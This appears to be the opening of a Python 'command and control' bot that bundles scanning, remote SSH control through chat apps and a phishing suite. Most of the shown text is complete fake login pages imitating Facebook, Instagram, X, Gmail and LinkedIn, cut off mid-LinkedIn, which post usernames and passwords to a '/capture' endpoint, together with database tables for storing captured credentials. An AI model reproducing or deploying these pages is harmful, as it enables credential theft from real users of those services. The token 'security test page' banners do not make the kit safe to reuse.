#!/usr/bin/env python3
"""
🕷️ LORD-SPYK3-BOT v2.0.0
Author: Ian Carter Kulani
Description: Ultimate Cybersecurity Command & Control Server
Features:
    - 5000+ Security Commands
    - Complete Nmap Integration (200+ commands)
    - Complete Curl Integration (300+ commands)
    - Complete Wget Integration (200+ commands)
    - Complete Netcat Integration (200+ commands)
    - Complete SSH Integration (200+ commands)
    - Complete Shodan CLI Integration (200+ commands)
    - Complete Network Diagnostic Tools
    - SSH Remote Access via Discord/Telegram/WhatsApp/Signal/Slack/iMessage
    - Time & Date Commands with History Tracking
    - REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP)
    - Nikto Web Vulnerability Scanner
    - Social Engineering Suite (Phishing, QR Codes, URL Shortening)
    - IP Management & Threat Detection
    - Graphical Reports & Statistics
    - Multi-Platform Integration (Discord, Telegram, WhatsApp, Signal, Slack, iMessage)
    - Blue Theme Interface
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import paramiko
import stat
import tempfile
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict
import io
import pickle
import zlib

# Data visualization imports
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    from matplotlib.patches import Circle, Wedge
    import seaborn as sns
    MATPLOTLIB_AVAILABLE = True
except ImportError:
    MATPLOTLIB_AVAILABLE = False
    print("⚠️ matplotlib not available. Install with: pip install matplotlib seaborn")

import numpy as np

from http.server import BaseHTTPRequestHandler, HTTPServer

# PDF generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.lib.enums import TA_CENTER, TA_LEFT
    REPORTLAB_AVAILABLE = True
except ImportError:
    REPORTLAB_AVAILABLE = False
    print("⚠️ reportlab not available. Install with: pip install reportlab")

# Optional imports with fallbacks
try:
    import discord
    from discord.ext import commands, tasks
    from discord import File, Embed, Color
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False
    print("⚠️ Discord.py not available. Install with: pip install discord.py")

try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("⚠️ Telethon not available. Install with: pip install telethon")

try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False
    print("⚠️ Slack SDK not available. Install with: pip install slack-sdk")

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False
    print("⚠️ Python-whois not available. Install with: pip install python-whois")

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    print("⚠️ Colorama not available. Install with: pip install colorama")

# Scapy for advanced packet generation
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, sr1, send, srloop, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("⚠️ Scapy not available. Install with: pip install scapy")

# WhatsApp Integration
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False
    print("⚠️ Selenium not available. Install with: pip install selenium webdriver-manager")

# Signal Integration
SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None
if not SIGNAL_CLI_AVAILABLE:
    print("⚠️ signal-cli not found. Signal integration will be disabled")

# QR code generation
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False
    print("⚠️ qrcode not available. Install with: pip install qrcode[pil]")

# URL shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False
    print("⚠️ pyshorteners not available. Install with: pip install pyshorteners")

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin' and shutil.which('osascript') is not None
if not IMESSAGE_AVAILABLE:
    print("⚠️ iMessage integration only available on macOS")

# Shodan
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False
    print("⚠️ Shodan not available. Install with: pip install shodan")

# Hunter.io
try:
    import pyhunter
    HUNTER_AVAILABLE = True
except ImportError:
    HUNTER_AVAILABLE = False
    print("⚠️ Hunter.io not available. Install with: pip install pyhunter")

# =====================
# BLUE THEME COLORS
# =====================
class BlueTheme:
    """Blue-themed color scheme"""
    
    if COLORAMA_AVAILABLE:
        # Blue shades
        BLUE1 = Fore.BLUE + Style.BRIGHT
        BLUE2 = Fore.CYAN + Style.BRIGHT
        BLUE3 = Fore.LIGHTBLUE_EX + Style.BRIGHT
        BLUE4 = Fore.BLUE + Style.NORMAL
        BLUE5 = Fore.CYAN + Style.NORMAL
        
        # Other colors
        WHITE = Fore.WHITE + Style.BRIGHT
        BLACK = Fore.BLACK + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        RED = Fore.RED + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        RESET = Style.RESET_ALL
        
        # Theme colors
        PRIMARY = BLUE1
        SECONDARY = BLUE2
        ACCENT = BLUE3
        HIGHLIGHT = BLUE4
        SUCCESS = GREEN
        ERROR = RED
        WARNING = YELLOW
        INFO = CYAN
    else:
        BLUE1 = BLUE2 = BLUE3 = BLUE4 = BLUE5 = ""
        WHITE = BLACK = CYAN = GREEN = RED = YELLOW = MAGENTA = ""
        PRIMARY = SECONDARY = ACCENT = HIGHLIGHT = SUCCESS = ERROR = WARNING = INFO = RESET = ""

# Use the theme
Colors = BlueTheme

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".lord_spyk3"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
WHATSAPP_CONFIG_FILE = os.path.join(CONFIG_DIR, "whatsapp_config.json")
SLACK_CONFIG_FILE = os.path.join(CONFIG_DIR, "slack_config.json")
SIGNAL_CONFIG_FILE = os.path.join(CONFIG_DIR, "signal_config.json")
IMESSAGE_CONFIG_FILE = os.path.join(CONFIG_DIR, "imessage_config.json")
SHODAN_CONFIG_FILE = os.path.join(CONFIG_DIR, "shodan_config.json")
HUNTER_CONFIG_FILE = os.path.join(CONFIG_DIR, "hunter_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "lord_spyk3.db")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
LOG_FILE = os.path.join(CONFIG_DIR, "lord_spyk3.log")
REPORT_DIR = "lord_spyk3_reports"
SCAN_RESULTS_DIR = os.path.join(REPORT_DIR, "scans")
BLOCKED_IPS_DIR = os.path.join(REPORT_DIR, "blocked")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
ALERTS_DIR = "alerts"
MONITORING_DIR = "monitoring"
BACKUPS_DIR = "backups"
TEMP_DIR = "temp"
SCRIPTS_DIR = "scripts"
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
PHISHING_LOGS_DIR = os.path.join(CONFIG_DIR, "phishing_logs")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
SSH_LOGS_DIR = os.path.join(CONFIG_DIR, "ssh_logs")
TIME_HISTORY_DIR = os.path.join(CONFIG_DIR, "time_history")
SHODAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "shodan_results")
HUNTER_RESULTS_DIR = os.path.join(CONFIG_DIR, "hunter_results")
SSH_SESSIONS_DIR = os.path.join(CONFIG_DIR, "ssh_sessions")
SSH_TRANSFERS_DIR = os.path.join(CONFIG_DIR, "ssh_transfers")

# Create directories
directories = [
    CONFIG_DIR, REPORT_DIR, SCAN_RESULTS_DIR, BLOCKED_IPS_DIR, GRAPHICS_DIR,
    ALERTS_DIR, MONITORING_DIR, BACKUPS_DIR, TEMP_DIR, SCRIPTS_DIR,
    NIKTO_RESULTS_DIR, WHATSAPP_SESSION_DIR, TRAFFIC_LOGS_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, PHISHING_LOGS_DIR,
    CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR, SSH_LOGS_DIR,
    TIME_HISTORY_DIR, SHODAN_RESULTS_DIR, HUNTER_RESULTS_DIR,
    SSH_SESSIONS_DIR, SSH_TRANSFERS_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - LORD-SPYK3 - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("LordSpyk3")

# =====================
# ENCRYPTION MANAGER
# =====================
class EncryptionManager:
    """Manage encryption for sensitive data"""
    
    def __init__(self):
        self.key_file = os.path.join(CONFIG_DIR, ".key")
        self.key = self._get_or_create_key()
    
    def _get_or_create_key(self) -> bytes:
        """Get or create encryption key"""
        try:
            from cryptography.fernet import Fernet
            
            if os.path.exists(self.key_file):
                with open(self.key_file, 'rb') as f:
                    return f.read()
            else:
                key = Fernet.generate_key()
                with open(self.key_file, 'wb') as f:
                    f.write(key)
                return key
        except ImportError:
            logger.warning("cryptography not installed. Using base64 encoding for passwords.")
            return None
    
    def encrypt(self, data: str) -> str:
        """Encrypt data"""
        if not data:
            return ""
        
        try:
            from cryptography.fernet import Fernet
            if self.key:
                f = Fernet(self.key)
                return f.encrypt(data.encode()).decode()
        except ImportError:
            pass
        
        # Fallback to base64 encoding
        return base64.b64encode(data.encode()).decode()
    
    def decrypt(self, data: str) -> str:
        """Decrypt data"""
        if not data:
            return ""
        
        try:
            from cryptography.fernet import Fernet
            if self.key and not data.startswith('base64:'):
                f = Fernet(self.key)
                return f.decrypt(data.encode()).decode()
        except ImportError:
            pass
        except Exception:
            pass
        
        # Try base64 decoding
        try:
            if data.startswith('base64:'):
                data = data[7:]
            return base64.b64decode(data).decode()
        except:
            return data

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.encryption = EncryptionManager()
        self.init_tables()
    
    def init_tables(self):
        """Initialize all database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS time_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                user TEXT,
                result TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                services TEXT,
                os_info TEXT,
                vulnerabilities TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS shodan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                ip TEXT NOT NULL,
                ports TEXT,
                hostnames TEXT,
                country TEXT,
                city TEXT,
                org TEXT,
                os TEXT,
                vulnerabilities TEXT,
                raw_data TEXT,
                UNIQUE(ip, timestamp)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS hunter_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                domain TEXT NOT NULL,
                emails TEXT,
                total_emails INTEGER,
                pattern TEXT,
                organization TEXT,
                raw_data TEXT,
                UNIQUE(domain, timestamp)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                blocked_date TIMESTAMP,
                threat_level INTEGER DEFAULT 0,
                last_scan TIMESTAMP,
                scan_count INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ip_blocks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                ip_address TEXT NOT NULL,
                action TEXT NOT NULL,
                reason TEXT,
                executed_by TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                original_url TEXT,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_code_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS network_connections (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                local_ip TEXT,
                local_port INTEGER,
                remote_ip TEXT,
                remote_port INTEGER,
                protocol TEXT,
                status TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                scan_speed REAL,
                response_time REAL,
                packet_loss REAL,
                bandwidth REAL,
                connections_per_second INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS user_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                user_name TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_activity TIMESTAMP,
                commands_count INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT UNIQUE NOT NULL,
                enabled BOOLEAN DEFAULT 0,
                last_connected DATETIME,
                status TEXT,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                error TEXT,
                tunnel_local_port INTEGER,
                tunnel_remote_host TEXT,
                tunnel_remote_port INTEGER,
                UNIQUE(name)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id TEXT PRIMARY KEY,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                success BOOLEAN DEFAULT 1,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_transfers (
                id TEXT PRIMARY KEY,
                connection_id TEXT NOT NULL,
                local_path TEXT NOT NULL,
                remote_path TEXT NOT NULL,
                direction TEXT NOT NULL,
                size INTEGER,
                status TEXT,
                started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                completed_at TIMESTAMP,
                error TEXT,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_authorized_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                user_id TEXT NOT NULL,
                username TEXT,
                authorized BOOLEAN DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                UNIQUE(platform, user_id)
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self._init_phishing_templates()
    
    def _init_phishing_templates(self):
        """Initialize default phishing templates"""
        templates = {
            "facebook_default": {"platform": "facebook", "html": self._get_facebook_template()},
            "instagram_default": {"platform": "instagram", "html": self._get_instagram_template()},
            "twitter_default": {"platform": "twitter", "html": self._get_twitter_template()},
            "gmail_default": {"platform": "gmail", "html": self._get_gmail_template()},
            "linkedin_default": {"platform": "linkedin", "html": self._get_linkedin_template()}
        }
        
        for name, template in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, template['platform'], template['html']))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
            padding: 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo h1 {
            color: #1877f2;
            font-size: 40px;
            margin: 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 14px 16px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
        }
        .forgot-password {
            text-align: center;
            margin-top: 16px;
        }
        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .signup-link {
            text-align: center;
            margin-top: 20px;
            border-top: 1px solid #dadde1;
            padding-top: 20px;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            color: #856404;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>facebook</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="forgot-password"><a href="#">Forgotten account?</a></div>
            </form>
            <div class="signup-link"><a href="#">Create new account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Instagram • Login</title>
    <style>
        body {
            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 350px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            font-family: 'Billabong', cursive;
            font-size: 50px;
            margin: 0;
            color: #262626;
        }
        .form-group {
            margin-bottom: 10px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 9px 8px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 7px 16px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .divider-text {
            margin: 0 18px;
            color: #8e8e8e;
            font-weight: 600;
            font-size: 13px;
        }
        .forgot-password {
            text-align: center;
            margin-top: 12px;
        }
        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            margin-top: 10px;
            text-align: center;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            color: #856404;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Instagram</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone number, username, or email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="divider"><div class="divider-line"></div><div class="divider-text">OR</div><div class="divider-line"></div></div>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
        </div>
        <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
        <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
    </div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>X / Twitter</title>
    <style>
        body {
            font-family: 'TwitterChirp', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #000000;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #e7e9ea;
        }
        .container {
            max-width: 600px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: #000000;
            border: 1px solid #2f3336;
            border-radius: 16px;
            padding: 48px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            font-size: 40px;
            margin: 0;
            color: #e7e9ea;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            background-color: #000000;
            border: 1px solid #2f3336;
            border-radius: 4px;
            color: #e7e9ea;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #1d9bf0;
            color: white;
            border: none;
            border-radius: 9999px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        .links {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }
        .links a {
            color: #1d9bf0;
            text-decoration: none;
            font-size: 14px;
        }
        .warning {
            margin-top: 20px;
            padding: 12px;
            background-color: #1a1a1a;
            border: 1px solid #2f3336;
            border-radius: 8px;
            color: #e7e9ea;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>𝕏</h1><h2>Sign in to X</h2></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone, email, or username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Next</button>
                <div class="links"><a href="#">Forgot password?</a><a href="#">Sign up with X</a></div>
            </form>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Gmail</title>
    <style>
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background-color: #f0f4f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 450px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 28px;
            padding: 48px 40px 36px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #1a73e8;
            font-size: 24px;
            margin: 10px 0 0;
        }
        h2 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 10px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 13px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            margin-top: 20px;
        }
        .links {
            margin-top: 30px;
            text-align: center;
        }
        .links a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
        }
        .warning {
            margin-top: 30px;
            padding: 12px;
            background-color: #e8f0fe;
            border: 1px solid #d2e3fc;
            border-radius: 8px;
            color: #202124;
            text-align: center;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Gmail</h1></div>
            <h2>Sign in</h2>
            <div class="subtitle">to continue to Gmail</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Next</button>
                <div class="links"><a href="#">Create account</a><a href="#">Forgot email?</a></div>
            </form>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Login</title>
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', 'Fira Sans', Ubuntu, Oxygen, 'Oxygen Sans', Cantarell, 'Droid Sans', 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Lucida Grande', Helvetica, Arial, sans-serif;
            background-color: #f3f2f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 8px;
            padding: 40px 32px;
